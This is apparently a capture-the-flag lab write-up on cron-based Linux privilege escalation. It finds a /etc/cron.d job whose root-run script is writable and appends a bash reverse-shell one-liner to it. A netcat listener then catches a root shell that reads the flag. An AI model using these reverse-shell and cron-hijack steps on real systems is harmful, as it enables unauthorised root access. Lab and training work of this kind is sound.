## Exercises

### Question 1 — What is the full path of the cron job that can be exploited?

Started by reading `/etc/crontab` again on this machine:

```shell
john@cron-box:~$ cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Nothing obviously exploitable here — no custom job at the bottom this time, and the `PATH` override line is commented out, so this crontab just inherits `PATH` from the environment rather than setting its own. The system-wide cron locations beyond `/etc/crontab` were the next thing to check:

```shell
john@cron-box:~$ ls /etc | grep cron

cron.d
cron.daily
cron.hourly
cron.monthly
cron.weekly
cron.yearly
crontab
```

**Breakdown:**

- `ls /etc` lists the contents of `/etc`
- `| grep cron` filters that listing down to entries containing "cron"

`cron.d` stood out as worth checking directly, since it holds drop-in crontab fragments that can each set their own `PATH`, independently of `/etc/crontab`:

```shell
john@cron-box:~$ cd /etc/cron.d

john@cron-box:/etc/cron.d$ ls

cleanup  e2scrub_all  sysstat
john@cron-box:/etc/cron.d$ ls -l

total 12
-rw-r--r-- 1 root root 139 Mar  3  2026 cleanup
-rw-r--r-- 1 root root 201 Feb 14  2020 e2scrub_all
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
john@cron-box:/etc/cron.d$ cat cleanup

SHELL=/bin/bash
PATH=/home/ubuntu:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

**Breakdown:**

- `cd /etc/cron.d` moves into the drop-in crontab directory
- `ls` / `ls -l` list its contents, plainly and with permission detail
- `cat cleanup` prints the `cleanup` fragment's contents

`cleanup`'s `PATH` line puts `/home/ubuntu` ahead of every standard system directory — the same pattern as the `antivirus.sh` scenario from the previous task, where a custom directory placed first in a crontab's `PATH` becomes the first place a bare command name is looked up. Checked whether the script this job actually calls still exists, since the fragment's job line itself wasn't shown yet but the `PATH` manipulation was already the interesting lead:

```shell
john@cron-box:/etc/cron.d$ find / -type f -name cleanup.sh 2>/dev/null

/usr/src/linux-aws-headers-6.8.0-1017/tools/usb/usbip/cleanup.sh
/usr/local/bin/cleanup.sh
```

**Breakdown:**

- `find / -type f -name cleanup.sh 2>/dev/null` searches the whole filesystem for a regular file named exactly `cleanup.sh`, discarding permission errors

`cleanup.sh` still exists, at `/usr/local/bin/cleanup.sh`. But since `/home/ubuntu` sits ahead of `/usr/local/bin` in this job's `PATH`, a malicious `cleanup.sh` placed in `/home/ubuntu` would theoretically be found and run first, before the real one.

**Answer:** `/etc/cron.d/cleanup`

### Question 2 — What are the contents of /root/flag.txt?

With a listener running on the attacking machine:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ nc -lvnp 4444                               

listening on [any] 4444 ...
```

The first attempt was to drop a malicious `cleanup.sh` directly into `/home/ubuntu`, to let the `PATH` ordering do the work:

```shell
john@cron-box:/etc/cron.d$ echo 'bash -i >& /dev/tcp/—REDACTED—/4444 0>&1' > /home/ubuntu/cleanup.sh

-bash: /home/ubuntu/cleanup.sh: Permission denied
```

Permission denied — `/home/ubuntu` isn't actually writable by the current user. Let's actually check whether the real script at `/usr/local/bin/cleanup.sh` could be edited directly first:

```shell
john@cron-box:/etc/cron.d$ echo 'bash -i >& /dev/tcp/—REDACTED—/4444 0>&1' >> /usr/local/bin/cleanup.sh

john@cron-box:/etc/cron.d$ cat /usr/local/bin/cleanup.sh

#!/bin/bash

find /tmp -type f -mtime +1 -delete
find /var/tmp -type f -mtime +7 -delete
echo "[cleanup] done at $(date)"
bash -i >& /dev/tcp/—REDACTED—/4444 0>&1
```

**Breakdown:**

- `echo '...' >> /usr/local/bin/cleanup.sh` appends the reverse shell one-liner as a new line at the end of the existing script, rather than overwriting it (`>>` appends; `>` would have replaced the whole file)
- `cat /usr/local/bin/cleanup.sh` confirms the append succeeded and shows the script's original purpose: deleting old files from `/tmp` and `/var/tmp`, and logging that it ran, before now also opening a reverse shell

That worked — the real script turned out to be writable. With the payload appended, the only thing left was waiting for the `/etc/cron.d/cleanup` job to fire again:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ nc -lvnp 4444                               

listening on [any] 4444 ...
connect to [—REDACTED—] from (UNKNOWN) [10.112.156.251] 53146
bash: cannot set terminal process group (1514): Inappropriate ioctl for device
bash: no job control in this shell
root@cron-box:~# 
```

The resulting shell's prompt (`root@cron-box:~#`) confirmed landing as root. From there, the flag was read:

```shell
root@cron-box:~# cat /root/flag.txt

—REDACTED—root@cron-box:~# 
```

**Answer:** `—REDACTED—`
